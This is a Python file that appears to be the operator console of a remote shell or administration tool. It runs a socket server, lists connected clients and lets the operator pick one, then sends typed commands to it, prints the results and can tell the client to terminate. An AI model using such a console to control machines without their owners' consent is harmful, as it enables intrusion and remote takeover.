import os
import sys
import threading

from common.util import parse
from server.config import SOCKET_ADDR
from server.core import Server
from server.util import get_funcs


def colored_input(text: str):
    inp = input(text + '\033[0;33m')
    print('\033[0;39m\033[0m', end='', flush=True)
    return inp


def start_cli():
    """ 接受命令输入 """
    os.system('')
    while True:
        try:
            command = colored_input('flc> ')
            if not command:
                continue
            # 退出服务端
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            # 查看客户端列表
            elif command in ['l', 'list']:
                server.test_connections()
                list_connections()
            # 连接到客户端
            elif 'select' in command:
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[int(command.replace('select', ''))]
                except (ValueError, IndexError):
                    print('[-] Not a valid selection')
                if connection is not None:
                    open_connection(connection)
            # 快速连接到最近上线的客户端
            elif command == 'q':
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[len(server.connections) - 1]
                except IndexError:
                    print('[-] No connection at this time')
                if connection is not None:
                    open_connection(connection)
            else:
                print('[-] Command not recognized')
        except KeyboardInterrupt:
            print('\033[0;39m\033[0m')
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print('[-] Error: {}'.format(e))


def list_connections():
    """ 查看已连接客户端列表 """
    for i, connection in enumerate(server.connections):
        print('{} {}'.format(i, connection.info))


def open_connection(connection):
    """ 给客户端发送命令 """
    print('[+] Connected to {}'.format(connection.address))
    connection.send_command('null', 'null')
    cwd = connection.recv_result()[1]
    funcs = get_funcs()
    while True:
        try:
            command = colored_input(cwd + '> ')
            if not command:
                continue
            name, arg = parse(command)
            if command in ['quit', 'exit']:
                break
            elif command == 'kill':
                connection.send_command(command)
                break
            elif name in funcs:
                if not funcs[name](arg, connection):
                    continue
            else:
                connection.send_command(command)
            status, result = connection.recv_result()
            if not status:
                result = '\033[0;31m{}\033[0m'.format(result)
            print(result)
            cwd = connection.recv_result()[1]
        except ConnectionResetError:
            print('[-] Connection closed')
            break
        except KeyboardInterrupt:
            print('\033[0;39m\033[0m')
            break
        except Exception as e:
            print('[-] Error: {}'.format(e))


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    start_cli()
